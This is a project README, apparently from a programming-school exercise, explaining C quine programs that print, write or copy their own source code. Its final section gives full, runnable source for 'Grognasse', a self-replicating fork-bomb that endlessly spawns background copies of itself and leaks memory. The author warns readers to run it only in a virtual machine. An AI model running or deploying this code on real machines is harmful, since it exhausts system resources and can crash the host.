
# Dr-Quine

This project contains 4 programs including 1 malware putting into  practice the concept of Quine programs  
The 4 programs are available in C language and in nasm

To run the programs in assembler, please execute the following command

```shell
nasm -f elf64 [program.s]
```
and
```shell
gcc -Wl,-z,noexecstack -no-pie [program.o]
```
## Colleen Description

The purpose of the Colleen program is to display its exact source code as if we had executed a "cat" on our program. There are however some constraints imposed such as the fact that the program must contain two different comments, a main function which would call another function.bIt was forbidden to display the source code through the location of the file in  the hard disk and
 the program had to take no argument


## Code explanation Colleen

Here is the Colleen program:

```C
void u(char*a){printf(a,10,34,a);}//)
int main(){char*a="void u(char*a){printf(a,10,34,a);}//)%cint main(){char*a=%2$c%3$s%2$c;u(a);/*o*/}";u(a);/*o*/}
```

%1$c = char '\n'  
%2$c = char '"'  
%3$s = char * a  

I put my whole program in a string as well as printf string "arguments"  
 that will display the string in the string surrounded by quotes
## Grace Description

The Grace program works the same way as Colleen but instead of  
 displaying its source code, it will write it to a new file named "Grace_kid.c"  
There was also an additional constraint, I was not allowed to  
 declare a main function but I could use macros (3 max)

## Code explanation Grace

Here is the Grace program:

```C
#include <stdio.h>
#define s "#include <stdio.h>%1$c#define s %2$c%3$s%2$c%1$c#define m(x) int main(){FILE*f=fopen(x,%2$cw%2$c);fprintf(f,s,10,34,s);fclose(f);}%1$cm(%2$cGrace_kid.c%2$c)//c"
#define m(x) int main(){FILE*f=fopen(x,"w");fprintf(f,s,10,34,s);fclose(f);}
m("Grace_kid.c")//c
```

The code is very similar to Colleen, it's just in macros  
 and calls a few extra functions to create files
## Sully Description

The slightly more complex Sully program will receive an int x directly  
 in its source code and will then self-replicate x times.
For example if x = 5  
 you will have after execution the files: Sully4.c, Sully3.c....Sully0.c.  
 If you enter a very large number, you can abort execution with '^C'.  
 Note that the function will not directly create x files  
  but only one and will execute it to create another and so on

## Code explanation Sully

Here is the Sully program:

```C
#include <stdio.h> <string.h> <stdlib.h>
#define b 5
#define s "#include <stdio.h> <string.h> <stdlib.h>%1$c#define b %4$d%1$c#define s %2$c%3$s%2$c%1$c#define m() int main(){char y[100]=%2$cSully%2$c;char r[100];sprintf(r,%2$c%%d%2$c,b-1);strcat(y,r);strcat(y,%2$c.c%2$c);FILE*f=fopen(y,%2$cw%2$c);fprintf(f,s,10,34,s,b-1);fclose(f);if(b>1){char w[160]=%2$cgcc %2$c;strcat(w, y);system(w);system(%2$c./a.out%2$c);}}%1$cm()//c"
#define m() int main(){char y[100]="Sully";char r[100];sprintf(r,"%d",b-1);strcat(y,r);strcat(y,".c");FILE*f=fopen(y,"w");fprintf(f,s,10,34,s,b-1);fclose(f);if(b>1){char w[160]="gcc ";strcat(w, y);system(w);system("./a.out");}}
m()//c
```

%4$d = b - 1 (5 - 1)  

I started by defining in macro 'b' the decrementor.
Since Itoa doesn't work  
 on all machines depending on language versions, I used "sprintf"   
 to convert 'b' to string for embedding in filenames with Strcat.
Then I used   
the "system" command to have my code run the file it had just created  
 so it could in turn do the same
## Grognasse Description

Grognasse is a little malware created by using Sully's code.  
Unlike Sully, the int x is always initially equal to 1
but it will increment.  
 Moreover, each time a file is executed, Grognasse will create  
  x sub-files while continuing to increment x.  
I also added a malloc(1,000,000) to each call to make the memory work  
 and finally I made the execution of the program a process,  
therefore it is no longer possible to stop it via ' ^C'.  
Several processes will therefore be created almost simultaneously,  
 which will make the execution quite difficult to stop.

Note: in assembler, I didn't use malloc
## Code explanation Grognasse

### **Warning !!**  

Although Grognasse is not a very powerful virus,  
 do not run it outside of a virtual machine.  
Otherwise, you expose yourself to a significant slowdown in your performance  
 because your processor will be overloaded.  

Here is the Grognasse program:

```C
#include <stdio.h> <string.h> <stdlib.h>
#define b 1
#define s "#include <stdio.h> <string.h> <stdlib.h>%1$c#define b %4$d%1$c#define s %2$c%3$s%2$c%1$c#define m() int main(){for(int i=b; i>0; i++){char*h=malloc(1000000);char y[100]=%2$cGrognasse%2$c;char r[100];sprintf(r,%2$c%%d%2$c,b+1);strcat(y,r);strcat(y,%2$c.c%2$c);FILE*f=fopen(y,%2$cw%2$c);fprintf(f,s,10,34,s,b+1);fclose(f);char w[160]=%2$cgcc %2$c;strcat(w, y);system(w);system(%2$c./a.out &%2$c);}}%1$cm()//c"
#define m() int main(){for(int i=b; i>0; i++){char*h=malloc(1000000);char y[100]="Grognasse";char r[100];sprintf(r,"%d",b+1);strcat(y,r);strcat(y,".c");FILE*f=fopen(y,"w");fprintf(f,s,10,34,s,b+1);fclose(f);char w[160]="gcc ";strcat(w, y);system(w);system("./a.out &");}}
m()//c
```

```BASH
./a.out &
```
The presence of the '&' character makes the execution a process

## Authors

- [@Lbensimo](https://github.com/Lbensimo)

